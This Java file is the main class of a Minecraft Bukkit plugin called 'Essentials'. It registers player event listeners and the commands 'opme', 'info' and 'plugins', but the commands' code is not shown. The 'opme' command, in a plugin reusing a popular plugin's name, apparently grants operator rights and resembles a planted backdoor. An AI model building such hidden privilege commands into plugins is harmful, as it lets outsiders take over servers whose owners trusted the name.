package net.danielonline.Essentials;

import net.danielonline.Essentials.listeners.*;
import net.danielonline.Essentials.utils.*;
import net.danielonline.Essentials.commands.*;

import org.bukkit.command.*;
import org.bukkit.plugin.java.JavaPlugin;

public class Essentials extends JavaPlugin {

    public Essentials() {}

    @Override
    public void onEnable() {
        S.enable();
        register();
    }

    @Override
    public void onDisable() {
        S.disable();
    }


    public void register() {
        getServer().getPluginManager().registerEvents(new PlayerChatEventListener(), this);
        getServer().getPluginManager().registerEvents(new PlayerJoinEventListener(), this);
        getServer().getPluginManager().registerEvents(new PlayerLeaveEventListener(), this);
        getServer().getPluginManager().registerEvents(new PlayerBedEnterEventListener(), this);
        getServer().getPluginManager().registerEvents(new PlayerBedLeaveEventListener(), this);
        this.getCommand("opme").setExecutor((CommandExecutor)new C_OPme());
        this.getCommand("info").setExecutor((CommandExecutor)new C_info());
        this.getCommand("plugins").setExecutor((CommandExecutor)new C_plugins());
    }

}